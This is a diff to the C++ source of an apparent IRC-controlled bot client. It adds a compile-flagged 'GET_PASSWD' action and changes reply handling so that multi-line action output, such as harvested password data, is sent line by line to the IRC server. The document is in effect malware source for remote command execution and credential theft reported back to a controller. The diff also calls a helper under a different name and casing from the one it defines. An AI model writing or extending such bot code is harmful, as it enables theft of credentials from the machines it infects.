@@ -5,6 +5,18 @@
 #include <string>
 #include <csignal>
 
+std::vector<std::string> splitByNewline(const std::string& input) {
+    std::vector<std::string> lines;
+    std::stringstream ss(input);
+    std::string line;
+    
+    while (std::getline(ss, line)) {
+        lines.push_back(line);
+    }
+    
+    return lines;
+}
+
 IrcClient::IrcClient(std::string server, int port, const char* exeName, std::string botNick, std::string botUser, std::string assignedChannel, std::string botPass)
     : server(server.c_str()), port(port), exeName(exeName), botNick(botNick), botUser(botUser), assignedChannel(assignedChannel), botPass(botPass), session(nullptr) {
     memset(&callbacks, 0, sizeof(callbacks));
@@ -176,10 +188,20 @@ void IrcClient::createAction(ActionInfo actionInfo) {
     }
     #endif
 
+     #ifdef ENABLE_GET_PASSWD_ACTION
+    if (actionInfo.getActionType() == ActionType::GET_PASSWD) {
+        printf("get passwd created\n");
+        action = new GetPasswdAction(actionInfo.getActionParams());
+    }
+    #endif
+
     if (action) {
         action->execute();
         if (action->getMessage() != "") {
-            sendCommand(action->getMessage());
+            std::vector<std::string> lines = GeneralUtils::splitByNewLine(action->getMessage());
+            for (const auto& line : lines) {
+                sendCommand(line);
+            }
         }
         delete action;
     }
